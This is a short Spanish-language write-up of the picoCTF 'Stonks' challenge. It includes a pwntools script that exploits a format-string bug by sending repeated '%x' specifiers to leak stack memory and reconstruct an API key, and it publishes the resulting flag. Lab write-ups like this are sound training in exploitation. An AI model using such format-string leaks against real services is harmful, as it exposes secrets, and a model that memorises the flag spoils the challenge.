## Descripcion
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/a4ce675e8f85190152d66014c9eebd7e/vuln.c) `nc mercury.picoctf.net 59616`

## Pistas
Okay, maybe I'd believe you if you find my API key.

## Solucion
Analizar el código fuente del problema
Crear un sript para introducir el valor necesario para descifrar la llave API y obtener la bandera
```bash
from pwn import *

s = ""
r = remote('mercury.picoctf.net', 59616)
r.recvuntil("View my")
r.send("1\n")
r.recvuntil("What is your API token?\n")
r.send("%x" + "-%x"*40 + "\n")
r.recvline()
x = r.recvline()
x = x[:-1].decode()
for i in x.split('-'):
        if len(i) == 8:
                a = bytearray.fromhex(i)
                for b in reversed(a):
                        if b > 32 and b < 128:
                                s += chr(b)
print(s)
```

## Bandera
picoCTF{I_l05t_4ll_my_m0n3y_6148be54}

## Notas



